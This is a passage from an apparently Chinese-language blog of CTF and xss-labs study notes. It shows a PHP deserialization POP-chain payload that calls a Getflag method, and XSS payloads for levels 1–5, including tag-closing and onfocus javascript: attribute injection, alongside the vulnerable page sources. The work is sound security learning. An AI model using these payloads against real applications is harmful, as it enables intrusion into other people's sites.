class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        <span class="hljs-keyword">public</span> (w22m)<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p><br><br><br>\</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>&#123;$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>w22m&#125;();<br></code></pre></td></tr></table></figure>
<p>q:  </p>
<blockquote>
<p>的意思是让将w22m的值作为参数输入w00m吗</p>
</blockquote>
<p>kimi:</p>
<blockquote>
<p>不是的,例如，如果 $this-&gt;w22m 的值是 ‘Getflag’，那么这行代码就相当于 $this-&gt;w00m-&gt;Getflag()。 </p>
</blockquote>
<p>q:</p>
<blockquote>
<p>那就是执行w00m中的getflag()？</p>
</blockquote>
<p>kimi:</p>
<blockquote>
<p>是的，这行代码的意思是执行 $this-&gt;w00m 对象中的 Getflag() 方法</p>
</blockquote>
<h2 id="那么我看总的意思是："><a href="#那么我看总的意思是：" class="headerlink" title="那么我看总的意思是："></a>那么我看总的意思是：</h2><p>将w22m中的w00m赋值为w33m的类<br>再将w22m中w00m（现已为w33m类）的w00m赋值为w44m的类<br>最后将w22m中的w00m（现已为w33m类）中的w22m赋值为‘GetFlag’<br>最后由于__toString()函数，会将改类下的w22m的值作为w44m中的的元素执行，那结果就是执行w44m中的Getflag<br>输出flag</p>
<p>wp作者：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a=new w22m();<span class="hljs-comment">//这段代码说明我们将w22m类赋值给a，现在可以将$a看做w22m类,所以现在$a中有一个属性w00m</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>w00m=new w33m();<span class="hljs-comment">//将w22m中的w00m属性调用（指向）w33m类：现在w22m中w00m属性有w33类中w00m和w22m两个属性。</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w00m=new w44m();<span class="hljs-comment">//w22m类中w00m属性调用了w44m类</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<span class="hljs-comment">//使用了w44m类中的Getflag方法，()在w33m中_toString()方法被调用。</span><br>最后的效果就是在w44m中执行了Getflag()整个方法，输出了$flag的值。<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a></p>
<p>最后payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w33m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;w44madmin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;*passwd&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;08067&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Getflag&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>传入要型url编码，</p>
<blockquote>
<p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错</p>
</blockquote>
<hr>
<h2 id="title-xss-labs-studynotesdate-2025-10-01-01-59-18tags"><a href="#title-xss-labs-studynotesdate-2025-10-01-01-59-18tags" class="headerlink" title="title: xss-labs-studynotesdate: 2025-10-01 01:59:18tags:"></a>title: xss-labs-studynotes<br>date: 2025-10-01 01:59:18<br>tags:</h2><h1 id="打一下xss-labs"><a href="#打一下xss-labs" class="headerlink" title="打一下xss-labs"></a>打一下xss-labs</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>可以直接用payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>自己没试出来，去网上找payload，发现<strong>闭合型标签</strong>注入可用：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
<p>源码：   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>分析一下源码，先是有htmlspcialchar来进行转义特殊字符，但是在下面的.$str.没有，所以也不需要考虑绕过<br>如果插入：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
<p>会变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=keyword  value=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里是先闭合了双引号，再闭合了input的尖括号，最后的script就变成了新元素执行了  </p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>先尝试：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">aler</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>查看返回页面原码：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span>	<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:27<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>全都进行了转义，<br>学习了网上的 onfocus事件绕过<br>在不需要&lt;&gt;的情况下完成绕过，大概就是在用户触发onfocus时会调用 onfocus&#x3D;”myFuncuntion()” 里的myFuncuntion,但是面对未知源码的网站我们不知道有什么确切的函数<br>所以使用JavaScript伪协议进行绕过，<br>JavaScript 协议（javascript:）是一种特殊的 URL 协议，用于在浏览器中直接执行 JavaScript 代码   </p>
<p>示例用法：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Hello, World!&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>所以构造payload:  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span><span class="hljs-variable constant_">XSS</span><span class="hljs-string">&#x27;) &#x27;</span><br><br>这时候：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;114514&#x27;</span>&gt;<br><br>会变成：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;finish&#x27;</span> onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>) <span class="hljs-string">&#x27;&#x27;</span>&gt;<br><br>这时候点击输入框触发onfocus就能执行<br></code></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>先查看一下页面源码：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和114514相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114514&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>注意到与level 3 只是 单引号 变成了 双引号   </p>
<p>遂构造：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; onfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
<p>完成挑战  </p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>先看一下前端：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和find a way out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>怎么感觉，和上一关一样啊？<br>但是：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span 